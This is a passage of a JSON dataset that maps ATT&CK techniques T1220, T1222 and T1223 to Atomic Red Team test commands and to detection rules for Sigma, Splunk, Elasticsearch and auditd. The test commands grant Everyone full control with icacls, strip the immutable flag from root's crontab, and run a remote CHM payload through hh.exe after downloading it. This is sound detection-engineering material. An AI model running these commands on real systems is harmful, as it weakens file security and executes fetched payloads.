CommandLine|contains: '/format' # wmic process list /FORMAT /?\n      - Image|endswith: '\\msxsl.exe'\n    condition: selection\nfalsepositives:\n    - WMIC.exe FP depend on scripts and administrative methods used in the monitored environment\n    - msxsl.exe is not installed by default so unlikely.\nlevel: medium\ntags:\n    - attack.execution\n    - attack.t1220", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: XSL Script Processing\nid: 05c36dd6-79d6-4a9a-97da-3db20298ab2d\nstatus: experimental\ndescription: Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files, rule detects when adversaries\n    abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses\nauthor: Timur Zinniatullin, oscd.community\ndate: 2019/10/21\nmodified: 2019/11/04\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1220/T1220.yaml\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n      - Image|endswith: '\\wmic.exe'\n        CommandLine|contains: '/format' # wmic process list /FORMAT /?\n      - Image|endswith: '\\msxsl.exe'\n    condition: selection\nfalsepositives:\n    - WMIC.exe FP depend on scripts and administrative methods used in the monitored environment\n    - msxsl.exe is not installed by default so unlikely.\nlevel: medium\ntags:\n    - attack.execution\n    - attack.t1220", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "((Image.keyword:*\\\\\\\\wmic.exe AND CommandLine.keyword:*\\\\/format*) OR Image.keyword:*\\\\\\\\msxsl.exe)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/XSL-Script-Processing <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"XSL Script Processing\",\\n    \"description\": \"Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files, rule detects when adversaries abuse this functionality to execute arbitrary files while potentially bypassing application whitelisting defenses\",\\n    \"tags\": [\\n      \"attack.execution\",\\n      \"attack.t1220\"\\n    ],\\n    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\wmic.exe AND CommandLine.keyword:*\\\\\\\\/format*) OR Image.keyword:*\\\\\\\\\\\\\\\\msxsl.exe)\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"((Image.keyword:*\\\\\\\\\\\\\\\\wmic.exe AND CommandLine.keyword:*\\\\\\\\/format*) OR Image.keyword:*\\\\\\\\\\\\\\\\msxsl.exe)\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'XSL Script Processing\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "((Image.keyword:*\\\\\\\\wmic.exe AND CommandLine.keyword:*\\\\/format*) OR Image.keyword:*\\\\\\\\msxsl.exe)", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "((Image=\"*\\\\\\\\wmic.exe\" CommandLine=\"*/format*\") OR Image=\"*\\\\\\\\msxsl.exe\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" ((Image=\"*\\\\\\\\wmic.exe\" CommandLine=\"*/format*\") OR Image=\"*\\\\\\\\msxsl.exe\"))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*(?:.*(?=.*.*\\\\wmic\\\\.exe)(?=.*.*/format.*))|.*.*\\\\msxsl\\\\.exe))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1222/T1222.yaml", "command": "takeown.exe /f PathToAtomicsFolder\\T1222\\T1222.yaml\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "takeown.exe /f PathToAtomicsFolder\\T1222 /r\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "cacls.exe #{file_or_folder} /grant Everyone:F\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "cacls.exe PathToAtomicsFolder\\T1222\\T1222.yaml /grant Everyone:F\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "cacls.exe #{file_or_folder} /grant Everyone:F /t\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "cacls.exe PathToAtomicsFolder\\T1222 /grant Everyone:F /t\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "icacls.exe #{file_or_folder} /grant Everyone:F\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "icacls.exe PathToAtomicsFolder\\T1222\\T1222.yaml /grant Everyone:F\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "icacls.exe #{file_or_folder} /grant Everyone:F /t\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "icacls.exe PathToAtomicsFolder\\T1222 /grant Everyone:F /t\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "attrib.exe -r PathToAtomicsFolder\\T1222\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chmod #{numeric_mode} /tmp/AtomicRedTeam/atomics/T1222\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chmod #{symbolic_mode} /tmp/AtomicRedTeam/atomics/T1222\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chmod a+w /tmp/AtomicRedTeam/atomics/T1222\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chmod #{numeric_mode} /tmp/AtomicRedTeam/atomics/T1222 -R\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chmod #{symbolic_mode} /tmp/AtomicRedTeam/atomics/T1222 -R\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chmod a+w /tmp/AtomicRedTeam/atomics/T1222 -R\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown root:#{group} #{file_or_folder}\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown root:root #{file_or_folder}\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown #{owner}:#{group} /tmp/AtomicRedTeam/atomics/T1222/T1222.yaml\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown root:#{group} #{file_or_folder} -R\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown root:root #{file_or_folder} -R\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown #{owner}:#{group} /tmp/AtomicRedTeam/atomics/T1222 -R\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown root #{file_or_folder}\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown root /tmp/AtomicRedTeam/atomics/T1222/T1222.yaml\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown root #{file_or_folder} -R\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chown root /tmp/AtomicRedTeam/atomics/T1222 -R\n", "name": null}, {"source": "atomics/T1222/T1222.yaml", "command": "chattr -i /var/spool/cron/root\n", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "chmod 766 test1.txt", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "chmod u+x test1.txt", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "chmod o-x test1.txt", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "chown ec2-user:ec2-user test1.txt", "name": null}, {"source": "Kirtar22/Litmus_Test", "command": "```", "name": null}], "command_list": ["takeown.exe /f PathToAtomicsFolder\\T1222\\T1222.yaml\n", "takeown.exe /f PathToAtomicsFolder\\T1222 /r\n", "cacls.exe #{file_or_folder} /grant Everyone:F\n", "cacls.exe PathToAtomicsFolder\\T1222\\T1222.yaml /grant Everyone:F\n", "cacls.exe #{file_or_folder} /grant Everyone:F /t\n", "cacls.exe PathToAtomicsFolder\\T1222 /grant Everyone:F /t\n", "icacls.exe #{file_or_folder} /grant Everyone:F\n", "icacls.exe PathToAtomicsFolder\\T1222\\T1222.yaml /grant Everyone:F\n", "icacls.exe #{file_or_folder} /grant Everyone:F /t\n", "icacls.exe PathToAtomicsFolder\\T1222 /grant Everyone:F /t\n", "attrib.exe -r PathToAtomicsFolder\\T1222\n", "chmod #{numeric_mode} /tmp/AtomicRedTeam/atomics/T1222\n", "chmod #{symbolic_mode} /tmp/AtomicRedTeam/atomics/T1222\n", "chmod a+w /tmp/AtomicRedTeam/atomics/T1222\n", "chmod #{numeric_mode} /tmp/AtomicRedTeam/atomics/T1222 -R\n", "chmod #{symbolic_mode} /tmp/AtomicRedTeam/atomics/T1222 -R\n", "chmod a+w /tmp/AtomicRedTeam/atomics/T1222 -R\n", "chown root:#{group} #{file_or_folder}\n", "chown root:root #{file_or_folder}\n", "chown #{owner}:#{group} /tmp/AtomicRedTeam/atomics/T1222/T1222.yaml\n", "chown root:#{group} #{file_or_folder} -R\n", "chown root:root #{file_or_folder} -R\n", "chown #{owner}:#{group} /tmp/AtomicRedTeam/atomics/T1222 -R\n", "chown root #{file_or_folder}\n", "chown root /tmp/AtomicRedTeam/atomics/T1222/T1222.yaml\n", "chown root #{file_or_folder} -R\n", "chown root /tmp/AtomicRedTeam/atomics/T1222 -R\n", "chattr -i /var/spool/cron/root\n", "```", "chmod 766 test1.txt", "chmod u+x test1.txt", "chmod o-x test1.txt", "```", "```", "chown ec2-user:ec2-user test1.txt", "```"], "technique_id": "T1222", "parsed_datasets": [{"Atomic Red Team Test - File Permissions Modification": {"display_name": "File Permissions Modification", "atomic_tests": [{"description": "Modifies the filesystem permissions of the specified file or folder to take ownership of the object.\n", "supported_platforms": ["windows"], "name": "Take ownership using takeown utility", "input_arguments": {"file_folder_to_own": {"default": "PathToAtomicsFolder\\T1222\\T1222.yaml", "type": "path", "description": "Path of the file or folder for takeown to take ownership."}}, "executor": {"command": "takeown.exe /f #{file_folder_to_own}\n", "name": "command_prompt"}}, {"description": "Modifies the filesystem permissions of the specified folder to take ownership of it and its contents.\n", "supported_platforms": ["windows"], "name": "Take ownership recursively using takeown utility", "input_arguments": {"folder_to_own": {"default": "PathToAtomicsFolder\\T1222", "type": "path", "description": "Path of the folder for takeown to take ownership."}}, "executor": {"command": "takeown.exe /f #{folder_to_own} /r\n", "name": "command_prompt"}}, {"description": "Modifies the filesystem permissions of the specified file or folder to allow the specified user or group Full Control.\n", "supported_platforms": ["windows"], "name": "cacls - Grant permission to specified user or group", "input_arguments": {"user_or_group": {"default": "Everyone", "type": "string", "description": "User or group to allow full control"}, "file_or_folder": {"default": "PathToAtomicsFolder\\T1222\\T1222.yaml", "type": "path", "description": "Path of the file or folder to change permissions."}}, "executor": {"command": "cacls.exe #{file_or_folder} /grant #{user_or_group}:F\n", "name": "command_prompt"}}, {"description": "Modifies the filesystem permissions of the specified folder and contents to allow the specified user or group Full Control.\n", "supported_platforms": ["windows"], "name": "cacls - Grant permission to specified user or group recursively", "input_arguments": {"user_or_group": {"default": "Everyone", "type": "string", "description": "User or group to allow full control"}, "file_or_folder": {"default": "PathToAtomicsFolder\\T1222", "type": "path", "description": "Path of the file or folder to change permissions."}}, "executor": {"command": "cacls.exe #{file_or_folder} /grant #{user_or_group}:F /t\n", "name": "command_prompt"}}, {"description": "Modifies the filesystem permissions of the specified file or folder to allow the specified user or group Full Control.\n", "supported_platforms": ["windows"], "name": "icacls - Grant permission to specified user or group", "input_arguments": {"user_or_group": {"default": "Everyone", "type": "string", "description": "User or group to allow full control"}, "file_or_folder": {"default": "PathToAtomicsFolder\\T1222\\T1222.yaml", "type": "path", "description": "Path of the file or folder to change permissions."}}, "executor": {"command": "icacls.exe #{file_or_folder} /grant #{user_or_group}:F\n", "name": "command_prompt"}}, {"description": "Modifies the filesystem permissions of the specified folder and contents to allow the specified user or group Full Control.\n", "supported_platforms": ["windows"], "name": "icacls - Grant permission to specified user or group recursively", "input_arguments": {"user_or_group": {"default": "Everyone", "type": "string", "description": "User or group to allow full control"}, "file_or_folder": {"default": "PathToAtomicsFolder\\T1222", "type": "path", "description": "Path of the file or folder to change permissions."}}, "executor": {"command": "icacls.exe #{file_or_folder} /grant #{user_or_group}:F /t\n", "name": "command_prompt"}}, {"description": "Removes the read-only attribute from a file or folder using the attrib.exe command.\n", "supported_platforms": ["windows"], "name": "attrib - Remove read-only attribute", "input_arguments": {"file_or_folder": {"default": "PathToAtomicsFolder\\T1222", "type": "path", "description": "Path of the file or folder remove attribute."}}, "executor": {"command": "attrib.exe -r #{file_or_folder}\n", "name": "command_prompt"}}, {"description": "Changes a file or folder's permissions using chmod and a specified numeric mode.\n", "supported_platforms": ["macos", "linux"], "name": "chmod - Change file or folder mode (numeric mode)", "input_arguments": {"numeric_mode": {"default": 755, "type": "string", "description": "Specified numeric mode value"}, "file_or_folder": {"default": "/tmp/AtomicRedTeam/atomics/T1222", "type": "path", "description": "Path of the file or folder"}}, "executor": {"command": "chmod #{numeric_mode} #{file_or_folder}\n", "name": "bash"}}, {"description": "Changes a file or folder's permissions using chmod and a specified symbolic mode.\n", "supported_platforms": ["macos", "linux"], "name": "chmod - Change file or folder mode (symbolic mode)", "input_arguments": {"file_or_folder": {"default": "/tmp/AtomicRedTeam/atomics/T1222", "type": "path", "description": "Path of the file or folder"}, "symbolic_mode": {"default": "a+w", "type": "string", "description": "Specified symbolic mode value"}}, "executor": {"command": "chmod #{symbolic_mode} #{file_or_folder}\n", "name": "bash"}}, {"description": "Changes a file or folder's permissions recursively using chmod and a specified numeric mode.\n", "supported_platforms": ["macos", "linux"], "name": "chmod - Change file or folder mode (numeric mode) recursively", "input_arguments": {"numeric_mode": {"default": 755, "type": "string", "description": "Specified numeric mode value"}, "file_or_folder": {"default": "/tmp/AtomicRedTeam/atomics/T1222", "type": "path", "description": "Path of the file or folder"}}, "executor": {"command": "chmod #{numeric_mode} #{file_or_folder} -R\n", "name": "bash"}}, {"description": "Changes a file or folder's permissions recursively using chmod and a specified symbolic mode.\n", "supported_platforms": ["macos", "linux"], "name": "chmod - Change file or folder mode (symbolic mode) recursively", "input_arguments": {"file_or_folder": {"default": "/tmp/AtomicRedTeam/atomics/T1222", "type": "path", "description": "Path of the file or folder"}, "symbolic_mode": {"default": "a+w", "type": "string", "description": "Specified symbolic mode value"}}, "executor": {"command": "chmod #{symbolic_mode} #{file_or_folder} -R\n", "name": "bash"}}, {"description": "Changes a file or folder's ownership and group information using chown.\n", "supported_platforms": ["macos", "linux"], "name": "chown - Change file or folder ownership and group", "input_arguments": {"owner": {"default": "root", "type": "string", "description": "Username of desired owner"}, "group": {"default": "root", "type": "string", "description": "Group name of desired group"}, "file_or_folder": {"default": "/tmp/AtomicRedTeam/atomics/T1222/T1222.yaml", "type": "path", "description": "Path of the file or folder"}}, "executor": {"command": "chown #{owner}:#{group} #{file_or_folder}\n", "name": "bash"}}, {"description": "Changes a file or folder's ownership and group information recursively using chown.\n", "supported_platforms": ["macos", "linux"], "name": "chown - Change file or folder ownership and group recursively", "input_arguments": {"owner": {"default": "root", "type": "string", "description": "Username of desired owner"}, "group": {"default": "root", "type": "string", "description": "Group name of desired group"}, "file_or_folder": {"default": "/tmp/AtomicRedTeam/atomics/T1222", "type": "path", "description": "Path of the file or folder"}}, "executor": {"command": "chown #{owner}:#{group} #{file_or_folder} -R\n", "name": "bash"}}, {"description": "Changes a file or folder's ownership only using chown.\n", "supported_platforms": ["macos", "linux"], "name": "chown - Change file or folder mode ownership only", "input_arguments": {"owner": {"default": "root", "type": "string", "description": "Username of desired owner"}, "file_or_folder": {"default": "/tmp/AtomicRedTeam/atomics/T1222/T1222.yaml", "type": "path", "description": "Path of the file or folder"}}, "executor": {"command": "chown #{owner} #{file_or_folder}\n", "name": "bash"}}, {"description": "Changes a file or folder's ownership only recursively using chown.\n", "supported_platforms": ["macos", "linux"], "name": "chown - Change file or folder ownership recursively", "input_arguments": {"owner": {"default": "root", "type": "string", "description": "Username of desired owner"}, "file_or_folder": {"default": "/tmp/AtomicRedTeam/atomics/T1222", "type": "path", "description": "Path of the file or folder"}}, "executor": {"command": "chown #{owner} #{file_or_folder} -R\n", "name": "bash"}}, {"description": "Remove's a file's `immutable` attribute using `chattr`.\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n", "supported_platforms": ["macos", "linux"], "name": "chattr - Remove immutable file attribute", "input_arguments": {"file_to_modify": {"default": "/var/spool/cron/root", "type": "path", "description": "Path of the file"}}, "executor": {"command": "chattr -i #{file_to_modify}\n", "name": "sh"}}], "attack_technique": "T1222"}}], "queries": [{"query": "title: File or folder permissions modifications\nid: 37ae075c-271b-459b-8d7b-55ad5f993dd8\nstatus: experimental\ndescription: Detects a file or folder permissions modifications\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1222/T1222.yaml\nauthor: Jakob Weinzettl, oscd.community\ndate: 2019/10/23\nmodified: 2019/11/08\ntags:\n    - attack.defense_evasion\n    - attack.t1222\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n      - Image|endswith: '\\takeown.exe'\n      - Image|endswith: \n            - '\\cacls.exe'\n            - '\\icacls.exe'\n        CommandLine|contains: '/grant'\n      - Image|endswith: '\\attrib.exe'\n        CommandLine|contains: '-r'\n    condition: selection\nfalsepositives:\n    - Users interacting with the files on their own (unlikely unless power users)\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: File or folder permissions modifications\nid: 37ae075c-271b-459b-8d7b-55ad5f993dd8\nstatus: experimental\ndescription: Detects a file or folder permissions modifications\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1222/T1222.yaml\nauthor: Jakob Weinzettl, oscd.community\ndate: 2019/10/23\nmodified: 2019/11/08\ntags:\n    - attack.defense_evasion\n    - attack.t1222\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n      - Image|endswith: '\\takeown.exe'\n      - Image|endswith: \n            - '\\cacls.exe'\n            - '\\icacls.exe'\n        CommandLine|contains: '/grant'\n      - Image|endswith: '\\attrib.exe'\n        CommandLine|contains: '-r'\n    condition: selection\nfalsepositives:\n    - Users interacting with the files on their own (unlikely unless power users)\nlevel: medium", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\takeown.exe OR (Image.keyword:(*\\\\\\\\cacls.exe OR *\\\\\\\\icacls.exe) AND CommandLine.keyword:*\\\\/grant*) OR (Image.keyword:*\\\\\\\\attrib.exe AND CommandLine.keyword:*\\\\-r*))", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/File-or-folder-permissions-modifications <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"File or folder permissions modifications\",\\n    \"description\": \"Detects a file or folder permissions modifications\",\\n    \"tags\": [\\n      \"attack.defense_evasion\",\\n      \"attack.t1222\"\\n    ],\\n    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\takeown.exe OR (Image.keyword:(*\\\\\\\\\\\\\\\\cacls.exe OR *\\\\\\\\\\\\\\\\icacls.exe) AND CommandLine.keyword:*\\\\\\\\/grant*) OR (Image.keyword:*\\\\\\\\\\\\\\\\attrib.exe AND CommandLine.keyword:*\\\\\\\\-r*))\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(Image.keyword:*\\\\\\\\\\\\\\\\takeown.exe OR (Image.keyword:(*\\\\\\\\\\\\\\\\cacls.exe OR *\\\\\\\\\\\\\\\\icacls.exe) AND CommandLine.keyword:*\\\\\\\\/grant*) OR (Image.keyword:*\\\\\\\\\\\\\\\\attrib.exe AND CommandLine.keyword:*\\\\\\\\-r*))\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'File or folder permissions modifications\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(Image.keyword:*\\\\\\\\takeown.exe OR (Image.keyword:(*\\\\\\\\cacls.exe *\\\\\\\\icacls.exe) AND CommandLine.keyword:*\\\\/grant*) OR (Image.keyword:*\\\\\\\\attrib.exe AND CommandLine.keyword:*\\\\-r*))", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(Image=\"*\\\\\\\\takeown.exe\" OR ((Image=\"*\\\\\\\\cacls.exe\" OR Image=\"*\\\\\\\\icacls.exe\") CommandLine=\"*/grant*\") OR (Image=\"*\\\\\\\\attrib.exe\" CommandLine=\"*-r*\"))", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"1\" (Image=\"*\\\\\\\\takeown.exe\" OR (Image IN [\"*\\\\\\\\cacls.exe\", \"*\\\\\\\\icacls.exe\"] CommandLine=\"*/grant*\") OR (Image=\"*\\\\\\\\attrib.exe\" CommandLine=\"*-r*\")))", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?:.*.*\\\\takeown\\\\.exe|.*(?:.*(?=.*(?:.*.*\\\\cacls\\\\.exe|.*.*\\\\icacls\\\\.exe))(?=.*.*/grant.*))|.*(?:.*(?=.*.*\\\\attrib\\\\.exe)(?=.*.*-r.*))))'", "product": "Atomic Threat Coverage", "name": "grep"}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=linux_audit syscall=90 OR syscall=91 OR sycall=268 | table msg,syscall,syscall_name,success,auid,comm,exe", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=linux_audit syscall=92 OR syscall=93 OR syscall=94 OR syscall=260 comm!=splunkd | table", "product": "Splunk", "name": null}, {"query": "msg,syscall,syscall_name,success,auid,comm,exe", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "-a always,exit -F arch=b64 -S chmod,fchmod,fchmodat -F auid>=1000 -F auid!=-1 -F key=perm_mod", "product": "Splunk", "name": null}, {"query": "-a always,exit -F arch=b64 -S chown,fchown,lchown,fchownat -F auid>=1000 -F auid!=-1 -F key=perm_mod", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=\"bash_history\" bash_command=\"chmod *\" | table host,user_name,bash_command", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}, {"query": "index=linux sourcetype=\"bash_history\" bash_command=\"chown *\" | table host,user_name,bash_command", "product": "Splunk", "name": null}, {"query": "```", "product": "Splunk", "name": null}], "possible_detections": [{"data_source": "auditlogs (audit.rules)"}, {"data_source": "bash_history logs"}], "attack_paths": []}, {"commands": [{"source": "atomics/T1223/T1223.yaml", "command": "hh.exe PathToAtomicsFolder\\T1223\\src\\T1223.chm\n", "name": null}, {"source": "atomics/T1223/T1223.yaml", "command": "hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm\n", "name": null}, {"source": "SysmonHunter - Compiled HTML File", "command": "\\windows\\hh.exe.chm", "name": null}, {"source": "SysmonHunter - Compiled HTML File", "command": "hh.exe|.chm", "name": null}], "command_list": ["hh.exe PathToAtomicsFolder\\T1223\\src\\T1223.chm\n", "hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm\n", "\\windows\\hh.exe.chm", "hh.exe|.chm"], "technique_id": "T1223", "parsed_datasets": [{"Atomic Red Team Test - Compiled HTML File": {"display_name": "Compiled HTML File", "atomic_tests": [{"dependencies": [{"description": "The payload must exist on disk at specified location (#{local_chm_file})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{local_chm_file}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1223/src/T1223.chm\" -OutFile \"#{local_chm_file}\"\n", "prereq_command": "if (Test-Path #{local_chm_file}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Compiled HTML Help Local Payload", "executor": {"elevation_required": false, "command": "hh.exe #{local_chm_file}\n", "name": "command_prompt"}, "description": "Uses hh.exe to execute a local compiled HTML Help payload.\n", "input_arguments": {"local_chm_file": {"default": "PathToAtomicsFolder\\T1223\\src\\T1223.chm", "type": "path", "description": "Local .chm payload"}}, "dependency_executor_name": "powershell"}, {"description": "Uses hh.exe to execute a remote compiled HTML Help payload.\n", "supported_platforms": ["windows"], "name": "Compiled HTML Help Remote Payload", "input_arguments": {"remote_chm_file": {"default": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1223/src/T1223.chm", "type": "url", "description": "Remote .chm payload"}}, "executor": {"elevation_required": false, "command": "hh.exe #{remote_chm_file}\n", "name": "command_prompt"}}], "attack_technique": "T1223"}}, {"SysmonHunter - T1223": {"phase": "Execution", "query": [{"process": {"image": {"pattern": "\\windows\\hh.exe"}}, "type": "process", "file": {"path": {"pattern": ".chm"}}}, {"process": {"cmdline": {"pattern": "hh.exe|.chm", "op": "and"}}, "type": "process"}], "description": null, "name": "Compiled HTML File", "level": "medium"}}], "queries": [{"query": "Sysmon| where EventID == 1and process_path contains \"hh.exe\"", "product": "Azure Sentinel", "name": "Compiled HTML File"}, {"query": "title: HH.exe execution\nid: 68c8acb4-1b60-4890-8e82-3ddf7a6dba84\ndescription: Identifies usage of hh.exe executing recently modified .chm files.\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Dan Beavin), oscd.community\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1223/T1223.yaml\n    - https://eqllib.readthedocs.io/en/latest/analytics/b25aa548-7937-11e9-8f5c-d46d6d62a49e.html\ndate: 2019/10/24\nmodified: 2019/11/11\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1223\ndetection:\n    selection:\n        Image|endswith: '\\hh.exe'\n        CommandLine|contains: '.chm'\n    condition: selection\nfalsepositives:\n    - unlike\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: HH.exe execution\nid: 68c8acb4-1b60-4890-8e82-3ddf7a6dba84\ndescription: Identifies usage of hh.exe executing recently modified .chm files.\nstatus: experimental\nauthor: E.M. Anhaus (orignally from Atomic Blue Detections, Dan Beavin), oscd.community\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1223/T1223.yaml\n    - https://eqllib.readthedocs.io/en/latest/analytics/b25aa548-7937-11e9-8f5c-d46d6d62a49e.html\ndate: 2019/10/24\nmodified: 2019/11/11\ntags:\n    - attack.defense_evasion\n    - attack.execution\n    - attack.t1223\ndetection:\n    selection:\n        Image|endswith: '\\hh.exe'\n        CommandLine|contains: '.chm'\n    condition: selection\nfalsepositives:\n    - unlike\nlevel: high\nlogsource:\n    category: process_creation\n    product: windows", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(Image.keyword:*\\\\\\\\hh.exe AND CommandLine.keyword:*.chm*)", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/HH.exe-execution <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"HH.exe execution\",\\n    \"description\": \"Identifies usage of hh.exe executing recently modified .chm files.\",\\n    \"tags\": [\\n      